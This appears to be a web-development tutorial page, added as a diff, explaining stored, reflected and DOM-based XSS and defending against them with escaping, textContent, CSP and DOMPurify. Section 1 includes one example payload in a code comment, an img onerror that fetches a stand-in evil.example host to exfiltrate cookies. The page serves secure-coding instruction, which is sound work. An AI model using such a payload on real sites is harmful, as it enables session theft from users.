@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+<script>/* WDW early theme: apply saved theme before first paint (prevents theme flash) */(function(){try{var ks=['wdw_theme','webdevworker_theme','calcworker_theme','theme'],t='dark';for(var i=0;i<ks.length;i++){var v=null;try{v=localStorage.getItem(ks[i]);}catch(_){}if(v){t=v;break;}}if(['dark','dim'].indexOf(t)<0)t='dark';document.documentElement.setAttribute('data-theme',t);if('scrollRestoration' in history)history.scrollRestoration='manual';}catch(e){}})();</script>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  
+  <title>XSS Attacks Explained: Types, Examples, and Prevention Guide (2026) | WebDevWorker</title>
+  <meta name="description" content="Learn cross-site scripting (XSS): stored, reflected, and DOM-based attacks with real examples, output escaping, CSP headers, and sanitization strategies."/>
+  <meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1"/>
+  <link rel="canonical" href="https://www.webdevworker.com/articles/xss-attacks-prevention-guide-2026.html"/>
+  <link rel="icon" type="image/png" href="/assets/favicon.png"/>
+  <meta name="theme-color" content="#eab308"/>
+
+  <!-- Open Graph -->
+  <meta property="og:title" content="XSS Attacks Explained: Types, Examples, and Prevention Guide (2026) | WebDevWorker"/>
+  <meta property="og:description" content="Learn cross-site scripting (XSS): stored, reflected, and DOM-based attacks with real examples, output escaping, CSP headers, and sanitization strategies."/>
+  <meta property="og:type" content="article"/>
+  <meta property="og:url" content="https://www.webdevworker.com/articles/xss-attacks-prevention-guide-2026.html"/>
+  <meta property="og:site_name" content="WebDevWorker"/>
+  <meta property="og:image" content="https://www.webdevworker.com/assets/logo.png"/>
+
+  <!-- Google AdSense -->
+  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-7358272532329016" crossorigin="anonymous"></script>
+
+  <!-- Schema.org JSON-LD -->
+  <script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "Article",
+      "headline": "XSS Attacks Explained: Types, Examples, and Prevention Guide (2026)",
+      "description": "Learn cross-site scripting (XSS): stored, reflected, and DOM-based attacks with real examples, output escaping, CSP headers, and sanitization strategies.",
+      "mainEntityOfPage": "https://www.webdevworker.com/articles/xss-attacks-prevention-guide-2026.html",
+      "datePublished": "2026-10-14",
+      "dateModified": "2026-10-14",
+      "author": {
+        "@type": "Organization",
+        "name": "Zaviyan LLC",
+        "url": "https://www.webdevworker.com/about.html"
+      },
+      "publisher": {
+        "@type": "Organization",
+        "name": "WebDevWorker",
+        "url": "https://www.webdevworker.com",
+        "logo": "https://www.webdevworker.com/assets/favicon.png"
+      }
+    },
+    {
+      "@type": "FAQPage",
+      "mainEntity": [
+                {
+          "@type": "Question",
+          "name": "What is the difference between stored and reflected XSS?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "Stored XSS persists on the server \u2014 for example in a database comment \u2014 and attacks everyone who views the page. Reflected XSS lives only in a crafted request, such as a malicious link, and fires when the victim clicks it. Stored XSS is more severe because one injection can compromise many users without any further action from the attacker."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "Does HTTPS prevent cross-site scripting?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "No. HTTPS encrypts traffic in transit but does nothing about malicious scripts running inside the victim's browser on your own domain. XSS is a code-injection problem, not a transport problem \u2014 it must be fixed with output encoding, sanitization, and Content Security Policy."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "Can modern frameworks like React still have XSS vulnerabilities?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "Yes. React escapes interpolated values by default, but dangerouslySetInnerHTML bypasses that protection entirely, and unsafe patterns like rendering URLs from user input into href attributes can still be exploited. Frameworks reduce accidental XSS; they do not eliminate the need for review of every raw-HTML escape hatch."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "Is input validation enough to stop XSS?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "No. Input validation is useful but insufficient, because the same input can be safe in one context and dangerous in another, and attackers constantly find new bypasses for blocklists. The reliable fix is output encoding at the point where data enters HTML, JavaScript, or a URL \u2014 applied consistently for every output."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "How does Content Security Policy help against XSS?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "CSP is an HTTP header that restricts which scripts and resources the browser may load. A strict policy like script-src 'self' blocks injected inline scripts from executing and can prevent stolen data from being exfiltrated, acting as a safety net when an escaping bug slips through. Deploy it in report-only mode first to find breakage before enforcing."
+          }
+        }
+      ]
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        {
+          "@type": "ListItem",
+          "position": 1,
+          "name": "Home",
+          "item": "https://www.webdevworker.com/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 2,
+          "name": "Guides Hub",
+          "item": "https://www.webdevworker.com/articles/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 3,
+          "name": "XSS Attacks and Prevention",
+          "item": "https://www.webdevworker.com/articles/xss-attacks-prevention-guide-2026.html"
+        }
+      ]
+    }
+  ]
+}
+  </script>
+
+  <link rel="stylesheet" href="/css/webdevworker.css?v=2026-wdw-v45"/>
+  <link rel="stylesheet" href="/css/ai-widget.css?v=2026-wdw-v45"/>
+
+  <style>
+    .guide-article-wrap {
+      max-width: 860px;
+      margin: 0 auto;
+      padding: 24px 16px 80px 16px;
+    }
+    .guide-hero {
+      margin-bottom: 32px;
+      padding-bottom: 24px;
+      border-bottom: 1px solid var(--border);
+    }
+    .guide-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 4px 12px;
+      background: rgba(234, 179, 8, 0.12);
+      border: 1px solid rgba(234, 179, 8, 0.35);
+      color: var(--brand-primary);
+      border-radius: 9999px;
+      font-size: 0.75rem;
+      font-weight: 800;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin-bottom: 14px;
+    }
+    .guide-title {
+      font-size: clamp(2rem, 3.5vw, 2.7rem);
+      font-weight: 900;
+      line-height: 1.22;
+      letter-spacing: -0.03em;
+      color: var(--text-main);
+      margin-bottom: 16px;
+    }
+    .guide-meta-strip {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 16px;
+      font-size: 0.85rem;
+      color: var(--text-muted);
+      align-items: center;
+    }
+    .tool-embed-banner {
+      background: linear-gradient(135deg, rgba(234, 179, 8, 0.12), rgba(15, 23, 42, 0.9));
+      border: 1px solid rgba(234, 179, 8, 0.35);
+      border-radius: 14px;
+      padding: 24px;
+      margin: 28px 0;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.35);
+    }
+    .tool-embed-banner h3 {
+      font-size: 1.25rem;
+      color: #ffffff;
+      margin: 0;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .tool-launch-btn {
+      align-self: flex-start;
+      background: linear-gradient(135deg, #ca8a04, #eab308);
+      color: #0f172a !important;
+      padding: 10px 22px;
+      border-radius: 8px;
+      font-weight: 700;
+      font-size: 0.92rem;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      box-shadow: 0 4px 14px rgba(234, 179, 8, 0.35);
+      transition: transform 0.15s ease;
+      text-decoration: none;
+    }
+    .tool-launch-btn:hover {
+      transform: translateY(-2px);
+    }
+    .toc-box {
+      background: var(--bg-surface);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 20px 24px;
+      margin: 28px 0;
+    }
+    .toc-box h3 { font-size: 0.95rem; color: var(--text-main); margin-bottom: 12px; font-weight: 800; text-transform: uppercase; letter-spacing: 0.5px; }
+    .toc-box ul { list-style-position: inside; color: var(--brand-primary); font-size: 0.92rem; line-height: 1.9; padding-left: 0; }
+    .guide-section { margin-bottom: 40px; }
+    .guide-section h2 {
+      font-size: 1.55rem;
+      font-weight: 800;
+      color: var(--text-main);
+      margin-bottom: 16px;
+      border-left: 4px solid var(--brand-primary);
+      padding-left: 14px;
+    }
+    .guide-section p {
+      color: var(--text-muted);
+      line-height: 1.8;
+      font-size: 1.02rem;
+      margin-bottom: 16px;
+    }
+    .formula-box {
+      background: #0f172a;
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 18px 20px;
+      margin: 20px 0;
+      font-family: var(--font-mono, monospace);
+      color: #38bdf8;
+      font-size: 0.92rem;
+      overflow-x: auto;
+      white-space: pre-wrap;
+      line-height: 1.6;
+    }
+    .code-box {
+      background: #020617;
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 18px 20px;
+      margin: 20px 0;
+      font-family: var(--font-mono, monospace);
+      color: #f8fafc;
+      font-size: 0.88rem;
+      overflow-x: auto;
+      line-height: 1.6;
+    }
+    .data-table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 24px 0;
+      font-size: 0.9rem;
+    }
+    .data-table th {
+      background: var(--bg-surface-elevated, #1e293b);
+      color: var(--text-main);
+      padding: 12px 14px;
+      text-align: left;
+      border-bottom: 1px solid var(--border);
+    }
+    .data-table td {
+      padding: 12px 14px;
+      border-bottom: 1px solid var(--border);
+      color: var(--text-muted);
+    }
+  </style>
+</head>
+<body>
+<div class="app-shell">
+  <!-- Sidebar Navigation -->
+  <aside class="sidebar" id="sidebar">
+    <!-- Populated via universal sync -->
+  </aside>
+  <div class="sidebar-backdrop" id="sidebarBackdrop"></div>
+
+  <!-- Main Viewport -->
+  <div class="main-viewport">
+    <header class="topbar">
+      <div class="topbar-left">
+        <button class="hamburger-btn" id="hamburgerBtn" title="Toggle Navigation Menu">☰</button>
+        <span class="topbar-title">WebDevWorker Guides &amp; Tutorials</span>
+      </div>
+      <div class="topbar-right">
+        <div style="position:relative; display:flex; align-items:center;">
+          <span style="position:absolute; left:12px; font-size:0.85rem; color:var(--text-muted); pointer-events:none;">🔍</span>
+          <input type="text" id="searchToolsInput" placeholder="Search 96 tools (⌘K)..." style="padding:7px 14px 7px 34px; background:var(--bg-subtle); border:1px solid var(--border); border-radius:8px; color:var(--text-main); font-size:0.82rem; width:220px; outline:none; transition:all 0.2s;" autocomplete="off" spellcheck="false">
+        </div>
+        <button class="theme-toggle-btn" id="themeToggleBtn"><span>🌙</span> Dark Mode</button>
+      </div>
+    </header>
+
+    <main class="page-container">
+      <article class="guide-article-wrap">
+        <nav aria-label="Breadcrumb" style="margin-bottom: 20px; font-size: 0.82rem; color: var(--text-dim);">
+          <a href="/" style="color: var(--brand-primary); text-decoration: none;">Home</a>
+          <span style="margin: 0 8px; color: var(--border);">/</span>
+          <a href="/articles/" style="color: var(--brand-primary); text-decoration: none;">Guides Hub</a>
+          <span style="margin: 0 8px; color: var(--border);">/</span>
+          <span style="color: var(--text-muted);">XSS Attacks and Prevention</span>
+        </nav>
+
+        <header class="guide-hero">
+          <div class="guide-badge">🔐 Auth & Security</div>
+          <h1 class="guide-title">XSS Attacks Explained: Types, Examples, and Prevention Guide (2026)</h1>
+          <div class="guide-meta-strip">
+            <span>📅 Updated October 2026</span>
+            <span style="color: #10b981; font-weight:700;">✓ Practical Code Examples</span>
+            <span>⏱️ 9 min read</span>
+            <span>🏢 Zaviyan LLC</span>
+          </div>
+        </header>
+
+        <div class="tool-embed-banner">
+          <h3><span>🛡️</span> Lock Down the Browser Attack Surface</h3>
+          <p>XSS is just one way attackers abuse the browser. Continue through the security guides to master CSRF tokens, security headers, and HTTPS hardening.</p>
+          <a href="/articles/" class="tool-launch-btn">Browse More Web Development Guides &rarr;</a>
+        </div>
+
+        <nav class="toc-box">
+          <h3>Guide Sections</h3>
+          <ul>
+            <li><a href="#sec1" style="color:var(--brand-primary);">1. What Cross-Site Scripting Really Is</a></li>
+<li><a href="#sec2" style="color:var(--brand-primary);">2. Stored, Reflected, and DOM-Based XSS</a></li>
+<li><a href="#sec3" style="color:var(--brand-primary);">3. Output Escaping and Context-Aware Encoding</a></li>
+<li><a href="#sec4" style="color:var(--brand-primary);">4. Content Security Policy as a Safety Net</a></li>
+<li><a href="#sec5" style="color:var(--brand-primary);">5. Sanitization and Framework-Level Protections</a></li>
+<li><a href="#faqs" style="color:var(--brand-primary);">6. Frequently Asked Questions (FAQs)</a></li>
+          </ul>
+        </nav>
+
+        <section id="sec1" class="guide-section">
+<h2>1. What Cross-Site Scripting Really Is</h2>
+<p>Cross-site scripting (XSS) happens when an attacker manages to run their own JavaScript inside another user's browser session on your site. Because the script executes in the trusted origin of your domain, it inherits everything the legitimate page can do: read cookies that are not flagged HttpOnly, issue authenticated requests, rewrite page content, and capture keystrokes. The server never notices anything wrong — the attack unfolds entirely between your page and the victim's browser.</p>
+<p>A concrete example makes the danger clear. Suppose a comment system renders user input with <code>innerHTML</code>:</p>
+<pre class="code-box">// VULNERABLE: user input injected straight into the DOM
+const comment = new URLSearchParams(location.search).get('comment');
+document.getElementById('comments').innerHTML = comment;
+
+// Attacker link: ?comment=&lt;img src=x onerror="fetch('https://evil.example/steal?c='+document.cookie)"&gt;
+// Victim clicks -&gt; their session cookie is sent to the attacker.</pre>
+<p>The fix is not to block the word "script" — attackers have endless bypasses for blocklists. The fix is to treat all user-controlled data as text, never as markup, unless you have a deliberate, well-tested reason. That principle, applied consistently at every output point, is what the rest of this guide implements.</p>
+</section>
+
+<section id="sec2" class="guide-section">
+<h2>2. Stored, Reflected, and DOM-Based XSS</h2>
+<p>XSS comes in three flavors, and knowing which one you are dealing with determines where the fix belongs. <strong>Stored XSS</strong> is the most dangerous: the payload is saved on your server — in a comment, a username, a support ticket — and executes every time anyone views it. One injection can compromise thousands of sessions, which is why stored XSS in a popular forum or CMS plugin regularly makes security headlines.</p>
+<p><strong>Reflected XSS</strong> does not persist. The payload arrives in the request itself — a crafted link or a search query that the server echoes back into the response without encoding. It only fires when a victim clicks the malicious link, so attackers pair it with phishing. <strong>DOM-based XSS</strong> never touches the server at all: client-side JavaScript reads something attacker-controlled (the URL fragment, <code>postMessage</code> data, <code>localStorage</code>) and writes it into the DOM unsafely. Server-side filters cannot see it, which makes code review of frontend sinks essential.</p>
+<table class="data-table"><thead><tr><th>XSS Type</th><th>Where the Payload Lives</th><th>Typical Vector</th><th>Primary Fix</th></tr></thead><tbody><tr><td>Stored (persistent)</td><td>Your database</td><td>Malicious comment or profile field</td><td>Encode on output; sanitize rich-text inputs</td></tr><tr><td>Reflected (non-persistent)</td><td>The request URL or form data</td><td>Crafted link echoed in a search page</td><td>Encode every reflected value</td></tr><tr><td>DOM-based</td><td>Client-side data flow only</td><td>Unsafe use of location.hash or postMessage</td><td>Use textContent; audit JS sinks</td></tr></tbody></table>
+<p>In practice, most applications need defenses against all three at once: encode on the server, audit sinks on the client, and add a Content Security Policy as a backstop.</p>
+</section>
+
+<section id="sec3" class="guide-section">
+<h2>3. Output Escaping and Context-Aware Encoding</h2>
+<p>Output escaping means converting characters that have meaning in HTML — <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>, quotes — into their inert entity equivalents before inserting data into a page. The critical detail is that escaping must match the <em>context</em>: HTML body, HTML attribute, JavaScript string, CSS, and URL contexts each have different dangerous characters. Escaping for the wrong context leaves a hole.</p>
+<p>In vanilla JavaScript, the safest pattern is to avoid HTML parsing entirely and use <code>textContent</code>, which treats the input as pure text:</p>
+<pre class="code-box">// SAFE: textContent never interprets markup
+const comment = new URLSearchParams(location.search).get('comment');
+document.getElementById('comments').textContent = comment;
+// Even if comment contains &lt;img onerror=...&gt;, it renders as harmless text.
+
+// When you MUST build HTML, escape first:
+function escapeHtml(s) {
+  return s.replace(/&amp;/g, '&amp;amp;')
+          .replace(/&lt;/g, '&amp;lt;')
+          .replace(/&gt;/g, '&amp;gt;')
+          .replace(/"/g, '&amp;quot;')
+          .replace(/'/g, '&amp;#39;');
+}</pre>
+<p>On the server, use your framework's auto-escaping templates (EJS <code>&lt;%= %&gt;</code>, Django templates, Blade <code>{{ }}</code>) and be suspicious of any "raw" or "safe" output directive — each one is a manual XSS review waiting to happen. For JavaScript contexts, prefer <code>JSON.stringify</code> over string concatenation, and never build event-handler attributes from user data.</p>
+</section>
+
+<section id="sec4" class="guide-section">
+<h2>4. Content Security Policy as a Safety Net</h2>
+<p>Content Security Policy (CSP) is an HTTP response header that tells the browser exactly which sources of scripts, styles, and other resources are allowed. Even if an XSS payload slips through your escaping, a strict CSP can stop it from executing or from phoning home. It is not a replacement for escaping — it is the net under the tightrope.</p>
+<p>A solid starting policy for a modern app blocks inline scripts entirely and whitelists only your own domain and explicitly trusted CDNs:</p>
+<pre class="code-box"># Nginx: strict CSP that neuters most injected scripts
+add_header Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none';" always;
+
+# Report violations to your own endpoint to discover breakage safely
+add_header Content-Security-Policy "default-src 'self'; script-src 'self'; report-uri /csp-report;" always;</pre>
+<p>Deploy CSP in report-only mode first (<code>Content-Security-Policy-Report-Only</code>), watch the violation reports for a week, fix legitimate breakage, and only then enforce. The most common breakage is inline event handlers and inline <code>&lt;script&gt;</code> blocks — move them to external files, which is better practice anyway. For the rare cases where inline scripts are unavoidable, use a per-request nonce instead of <code>'unsafe-inline'</code>.</p>
+</section>
+
+<section id="sec5" class="guide-section">
+<h2>5. Sanitization and Framework-Level Protections</h2>
+<p>Sometimes you genuinely need rich HTML from users — a WYSIWYG editor, formatted comments, embedded media. Blocklists ("strip script tags") are a losing game because browsers parse HTML in surprising ways. The correct tool is a well-maintained sanitizer with an allowlist approach, and DOMPurify is the industry standard:</p>
+<pre class="code-box">// npm i dompurify — then sanitize rich-text input before rendering
+import DOMPurify from 'dompurify';
+
+const dirty = userInput; // may contain &lt;svg onload=...&gt; tricks
+const clean = DOMPurify.sanitize(dirty, {
+  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'li'],
+  ALLOWED_ATTR: ['href'],
+});
+// clean is now safe to insert with innerHTML
+document.getElementById('bio').innerHTML = clean;</pre>
+<p>Modern frameworks help but do not make you immune. React escapes interpolated values by default, yet <code>dangerouslySetInnerHTML</code> exists for a reason — audit every use. Vue and Angular have similar escape hatches. Server-side, strip or encode on output rather than on input: input filtering mangles legitimate data and still misses context-specific attacks, while output encoding is applied exactly where the data meets the parser.</p>
+<p>Layer the defenses: encode by default, sanitize the rich-text exceptions, enforce a CSP, and flag session cookies HttpOnly so that even a successful script injection cannot easily harvest sessions. No single layer is perfect; together they make XSS an expensive attack to pull off.</p>
+</section>
+
+        <section id="faqs" class="guide-section">
+          <h2>6. Frequently Asked Questions (FAQs)</h2>
+          <div class="faq-list">
+            <div class="faq-item" style="background:var(--bg-surface); border:1px solid var(--border); border-radius:10px; margin-bottom:12px; overflow:hidden;">
+          <details style="padding:14px 18px;">
+            <summary style="font-weight:700; color:var(--text-main); cursor:pointer; font-size:0.95rem;">What is the difference between stored and reflected XSS?</summary>
+            <p style="margin-top:10px; color:var(--text-muted); font-size:0.9rem; line-height:1.65;">Stored XSS persists on the server — for example in a database comment — and attacks everyone who views the page. Reflected XSS lives only in a crafted request, such as a malicious link, and fires when the victim clicks it. Stored XSS is more severe because one injection can compromise many users without any further action from the attacker.</p>
+          </details>
+        </div>
+<div class="faq-item" style="background:var(--bg-surface); border:1px solid var(--border); border-radius:10px; margin-bottom:12px; overflow:hidden;">
+          <details style="padding:14px 18px;">
+            <summary style="font-weight:700; color:var(--text-main); cursor:pointer; font-size:0.95rem;">Does HTTPS prevent cross-site scripting?</summary>
+            <p style="margin-top:10px; color:var(--text-muted); font-size:0.9rem; line-height:1.65;">No. HTTPS encrypts traffic in transit but does nothing about malicious scripts running inside the victim's browser on your own domain. XSS is a code-injection problem, not a transport problem — it must be fixed with output encoding, sanitization, and Content Security Policy.</p>
+          </details>
+        </div>
+<div class="faq-item" style="background:var(--bg-surface); border:1px solid var(--border); border-radius:10px; margin-bottom:12px; overflow:hidden;">
+          <details style="padding:14px 18px;">
+            <summary style="font-weight:700; color:var(--text-main); cursor:pointer; font-size:0.95rem;">Can modern frameworks like React still have XSS vulnerabilities?</summary>
+            <p style="margin-top:10px; color:var(--text-muted); font-size:0.9rem; line-height:1.65;">Yes. React escapes interpolated values by default, but dangerouslySetInnerHTML bypasses that protection entirely, and unsafe patterns like rendering URLs from user input into href attributes can still be exploited. Frameworks reduce accidental XSS; they do not eliminate the need for review of every raw-HTML escape hatch.</p>
+          </details>
+        </div>
+<div class="faq-item" style="background:var(--bg-surface); border:1px solid var(--border); border-radius:10px; margin-bottom:12px; overflow:hidden;">
+          <details style="padding:14px 18px;">
+            <summary style="font-weight:700; color:var(--text-main); cursor:pointer; font-size:0.95rem;">Is input validation enough to stop XSS?</summary>
+            <p style="margin-top:10px; color:var(--text-muted); font-size:0.9rem; line-height:1.65;">No. Input validation is useful but insufficient, because the same input can be safe in one context and dangerous in another, and attackers constantly find new bypasses for blocklists. The reliable fix is output encoding at the point where data enters HTML, JavaScript, or a URL — applied consistently for every output.</p>
+          </details>
+        </div>
+<div class="faq-item" style="background:var(--bg-surface); border:1px solid var(--border); border-radius:10px; margin-bottom:12px; overflow:hidden;">
+          <details style="padding:14px 18px;">
+            <summary style="font-weight:700; color:var(--text-main); cursor:pointer; font-size:0.95rem;">How does Content Security Policy help against XSS?</summary>
+            <p style="margin-top:10px; color:var(--text-muted); font-size:0.9rem; line-height:1.65;">CSP is an HTTP header that restricts which scripts and resources the browser may load. A strict policy like script-src 'self' blocks injected inline scripts from executing and can prevent stolen data from being exfiltrated, acting as a safety net when an escaping bug slips through. Deploy it in report-only mode first to find breakage before enforcing.</p>
+          </details>
+        </div>
+          </div>
+        </section>
+
+        <div class="tool-embed-banner" style="margin-top: 48px;">
+          <h3>Keep leveling up</h3>
+          <p>Combine XSS defenses with CSRF protection, strict security headers, and HTTPS everywhere to close the most common browser-side attack paths.</p>
+          <a href="/articles/" class="tool-launch-btn">Explore the Guides Hub &rarr;</a>
+        </div>
+      </article>
+
+      <!-- Standard Enterprise Footer -->
+      <footer class="enterprise-footer" style="margin-top: 60px;">
+        <div class="footer-inner">
+          <div class="footer-grid">
+            <div class="footer-brand-col">
+              <a href="/"><img alt="WebDevWorker Logo" height="38" src="/assets/webdevworker-logo-horizontal.svg"/></a>
+              <p>96 professional developer, CSS, API, and DevOps utilities engineered for modern web teams. 100% private, client-side memory execution with zero telemetry.</p>
+              <div style="margin-top: 14px; font-size: 0.8rem; color: var(--text-dim);">
+                Operated by <strong>Zaviyan LLC</strong> &bull; <a href="mailto:business@zaviyanllc.com" style="color: var(--brand-primary); text-decoration: none;">business@zaviyanllc.com</a>
+              </div>
+            </div>
+            <div>
+              <div class="footer-col-title">Publications &amp; Resources</div>
+              <ul class="footer-col-links">
+                <li><a href="/articles/" style="color: var(--brand-primary); font-weight: 700;">Guides Hub</a></li>
+                <li><a href="/blog/index.html">Engineering Blog</a></li>
+                <li><a href="/about.html">About WebDevWorker</a></li>
+                <li><a href="/privacy.html">Privacy Policy</a></li>
+                <li><a href="/terms.html">Terms of Service</a></li>
+              </ul>
+            </div>
+          </div>
+          <div class="footer-bottom">
+            <div>&copy; 2026 WebDevWorker. Founded and engineered by Zaviyan. Operated by Zaviyan LLC. All Rights Reserved.</div>
+            <div style="display: flex; gap: 16px;">
+              <span>🔒 100% Client-Side Sandbox</span>
+              <span>⚡ Zero Telemetry</span>
+              <span>📲 Offline PWA Capable</span><a href="https://www.facebook.com/webdevworking/" target="_blank" rel="noopener" style="color: inherit; text-decoration: none;"><span>📘 Facebook</span></a>
+            </div>
+          </div>
+        </div>
+      </footer>
+    </main>
+  </div>
+</div>
+
+<script src="/js/webdevworker-common.js?v=2026-wdw-v45" defer></script>
+<script src="/js/ai-widget.js?v=2026-wdw-v45" defer></script>
+</body>
+</html>
